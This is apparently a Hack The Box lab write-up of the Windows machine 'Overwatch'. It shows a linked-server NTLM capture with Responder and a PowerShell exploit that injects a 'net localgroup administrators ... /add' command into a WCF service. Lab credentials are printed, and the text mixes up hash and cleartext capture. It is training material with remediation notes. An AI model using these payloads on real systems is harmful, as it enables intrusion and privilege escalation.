---
id: HTB-2026-OVERWATCH
title: Overwatch
excerpt: Offensive security write-up.
date: '2026-02-07'
tags:
  - WRITEUP
  - HACKTHEBOX
  - WINDOWS
  - MEDIUM
  - NTLM-CAPTURE
  - WCF-SERVICE
  - COMMAND-INJECTION
category: WRITEUP
platform: HACKTHEBOX
target_os: WINDOWS
difficulty: MEDIUM
severity: MEDIUM
icon: Terminal
author: '0x7CC'
---

# Hack The Box — Overwatch (Windows) Write-Up: Linked MSSQL NTLM Capture → WCF Service Command Injection

## TL;DR
On **Overwatch**, initial access is obtained by extracting database credentials from a public share, then triggering a linked server authentication to capture the NTLM hash of a privileged account. Privilege escalation leverages a command injection vulnerability in a WCF service running as LocalSystem.

---

## Target
- Host: `overwatch.htb`
- IP: `10.129.16.252`

---

## Recon: Open ports and public share discovery

### Nmap Scan
- **Port 445/tcp**: SMB (guest share readable)
- **Port 6520/tcp**: MSSQL
- **Port 8000/tcp**: WCF service

We inspect the public SMB share `software$` and locate the compiled binary `overwatch.exe` and its configuration file.

---

## Initial Foothold: Linked server NTLM capture

We extract hardcoded database credentials from the binary: `sqlsvc : TI0LKcfHzZw1Vv`.

After connecting to the SQL server, we observe a linked server named `SQL07`. We run Responder on our attack machine and trigger a linked server query:

```sql
EXEC ('SELECT 1') AT [SQL07];
```

The query triggers NTLM authentication, allowing us to capture the cleartext credentials for the user `sqlmgmt`:
- Username: `sqlmgmt`
- Password: `bIhBbzMMnB82yx`

We use these credentials to log in via WinRM and read the user flag.

---

## Privilege Escalation: WCF Service Command Injection

Inside the server, we analyze the decompiled WCF service binary `overwatch.exe` running on port 8000. The `KillProcess` method executes a PowerShell command without sanitizing the input:

```csharp
public string KillProcess(string processName)
{
    string scriptContents = "Stop-Process -Name " + processName + " -Force";
    pipeline.Commands.AddScript(scriptContents);
}
```

We write a PowerShell exploit script to call the WCF service and inject a command to add our user to the local Administrators group:

```powershell
$URI = "http://localhost:8000/MonitorService?wsdl"
$proxy = New-WebServiceProxy -Uri $URI -Namespace "WCF"
$payload = "test; net localgroup administrators overwatch\sqlmgmt /add #"
$proxy.KillProcess($payload)
```

The command executes as LocalSystem. We reconnect via WinRM with administrative rights and read the root flag.

---

## Defensive notes / remediation

### Fix
- Remove hardcoded database credentials from application binaries.
- Restrict SQL Server outbound traffic to prevent NTLM capture from linked servers.
- Sanitize inputs in WCF service methods before executing system scripts.

### Monitoring / detection ideas
- Alert on outbound SMB/NTLM traffic originating from the database service.
- Monitor execution of PowerShell scripts with command concatenation indicators.

---

## Lessons learned
- Shared administrative tools frequently contain high-value hardcoded credentials.
- Concatenating parameters into system processes running as LocalSystem leads to trivial privilege escalation.

---

## Appendix: Timeline summary
1. Recon -> Extract credentials from binary in public share.
2. Foothold -> Query linked server to capture NTLM hash, log in as `sqlmgmt`.
3. Privilege Escalation -> Inject command via local WCF service to gain administrative rights.

---
